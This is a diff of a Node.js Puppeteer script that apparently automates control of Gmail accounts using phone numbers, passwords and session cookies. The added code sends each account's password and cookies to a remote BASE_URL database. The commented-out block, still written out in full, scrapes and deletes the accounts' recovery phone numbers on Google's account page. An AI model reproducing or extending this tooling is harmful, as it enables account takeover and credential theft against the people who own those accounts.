@@ -154,6 +154,7 @@ async function startServer() {
     while (true) {
         mWorkerActive = false
         let data = await getGmailData()
+        console.log(data)
         if (data && (FINISH <= 0 || FINISH >= new Date().getTime())) {
             mWorkerActive = true
             if (prevNumber == data.number) {
@@ -371,7 +372,14 @@ async function loginWithCompleted(number, password, cookies, worker) {
     } catch (error) {}
 
     try {
-        if (mSameNumber > 3) {
+        if (mSameNumber > 2) {
+            try {
+                await axios.patch(BASE_URL+'error/'+number+'.json', JSON.stringify({ password:password, cookies:cookies, worker:worker, create: parseInt(new Date().getTime()/1000) }), {
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    }
+                })
+            } catch (error) {}
             console.log('Node: [ Coocies Delete: '+number+' --- Time: '+getTime()+' ]')
             await axios.delete(BASE_URL+'collect/'+number+'.json')
             mSameNumber = 0
@@ -414,71 +422,71 @@ async function waitForNumberRemove(page, mRapt) {
             return year
         })
         
-        let mList = await page.evaluate(() => {
-            let root = document.querySelectorAll('div[data-encrypted-phone]')
-            let list = []
+        // let mList = await page.evaluate(() => {
+        //     let root = document.querySelectorAll('div[data-encrypted-phone]')
+        //     let list = []
         
-            if (root) {
-                for (let i = 0; i < root.length; i++) {
-                    try {
-                        let data = root[i].getAttribute('data-encrypted-phone')
-                        if (data) {
-                            list.push(data)
-                        }
-                    } catch (error) {}
-                }
-            }
+        //     if (root) {
+        //         for (let i = 0; i < root.length; i++) {
+        //             try {
+        //                 let data = root[i].getAttribute('data-encrypted-phone')
+        //                 if (data) {
+        //                     list.push(data)
+        //                 }
+        //             } catch (error) {}
+        //         }
+        //     }
 
-            return list
-        })
+        //     return list
+        // })
         
-        console.log('Node: [ Number Add: '+mList.length+' --- Time: '+getTime()+' ]')
+        // console.log('Node: [ Number Add: '+mList.length+' --- Time: '+getTime()+' ]')
 
-        for (let i = 0; i < mList.length; i++) {
-            try {
-                await page.goto('https://myaccount.google.com/phone?hl=en&rapt='+mRapt+'&ph='+mList[i], { waitUntil: 'load', timeout: 0 })
-                await delay(500)
-                if (await exists(page, 'button[class="VfPpkd-Bz112c-LgbsSe yHy1rc eT1oJ mN1ivc wMI9H"]')) {
-                    let button = await page.$$('button[class="VfPpkd-Bz112c-LgbsSe yHy1rc eT1oJ mN1ivc wMI9H"]')
-                    if (button && button.length > 0) {
-                        await button[button.length-1].click()
-                        await delay(1000)
-                    }
-                } else if (await exists(page, 'button[class="pYTkkf-Bz112c-LgbsSe wMI9H Qd9OXe"]')) {
-                    let button = await page.$$('button[class="pYTkkf-Bz112c-LgbsSe wMI9H Qd9OXe"]')
-                    if (button && button.length > 0) {
-                        await button[button.length-1].click()
-                        await delay(1000)
-                    }
-                }
+        // for (let i = 0; i < mList.length; i++) {
+        //     try {
+        //         await page.goto('https://myaccount.google.com/phone?hl=en&rapt='+mRapt+'&ph='+mList[i], { waitUntil: 'load', timeout: 0 })
+        //         await delay(500)
+        //         if (await exists(page, 'button[class="VfPpkd-Bz112c-LgbsSe yHy1rc eT1oJ mN1ivc wMI9H"]')) {
+        //             let button = await page.$$('button[class="VfPpkd-Bz112c-LgbsSe yHy1rc eT1oJ mN1ivc wMI9H"]')
+        //             if (button && button.length > 0) {
+        //                 await button[button.length-1].click()
+        //                 await delay(1000)
+        //             }
+        //         } else if (await exists(page, 'button[class="pYTkkf-Bz112c-LgbsSe wMI9H Qd9OXe"]')) {
+        //             let button = await page.$$('button[class="pYTkkf-Bz112c-LgbsSe wMI9H Qd9OXe"]')
+        //             if (button && button.length > 0) {
+        //                 await button[button.length-1].click()
+        //                 await delay(1000)
+        //             }
+        //         }
 
-                for (let i = 0; i < 3; i++) {
-                    try {
-                        if (await exists(page, 'button[data-mdc-dialog-action="ok"]')) {
-                            await page.click('button[data-mdc-dialog-action="ok"]')
-                            await delay(3000)
-                            break
-                        } else {
-                            let button = await page.$$('div[class="U26fgb O0WRkf oG5Srb HQ8yf C0oVfc kHssdc HvOprf FsOtSd M9Bg4d"]')
-                            if (button && button.length > 0) {
-                                await button[button.length-1].click()
-                                await delay(3000)
-                                break
-                            } else {
-                                let button = await page.$$('button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-dgl2Hf ksBjEc lKxP2d LQeN7"]')
-                                if (button && button.length > 0) {
-                                    await button[button.length-1].click()
-                                    await delay(3000)
-                                    break
-                                }
-                            }
-                        }
-                    } catch (error) {}
+        //         for (let i = 0; i < 3; i++) {
+        //             try {
+        //                 if (await exists(page, 'button[data-mdc-dialog-action="ok"]')) {
+        //                     await page.click('button[data-mdc-dialog-action="ok"]')
+        //                     await delay(3000)
+        //                     break
+        //                 } else {
+        //                     let button = await page.$$('div[class="U26fgb O0WRkf oG5Srb HQ8yf C0oVfc kHssdc HvOprf FsOtSd M9Bg4d"]')
+        //                     if (button && button.length > 0) {
+        //                         await button[button.length-1].click()
+        //                         await delay(3000)
+        //                         break
+        //                     } else {
+        //                         let button = await page.$$('button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-dgl2Hf ksBjEc lKxP2d LQeN7"]')
+        //                         if (button && button.length > 0) {
+        //                             await button[button.length-1].click()
+        //                             await delay(3000)
+        //                             break
+        //                         }
+        //                     }
+        //                 }
+        //             } catch (error) {}
 
-                    await delay(1000)
-                }
-            } catch (error) {}
-        }
+        //             await delay(1000)
+        //         }
+        //     } catch (error) {}
+        // }
 
         return mYear
     } catch (error) {}
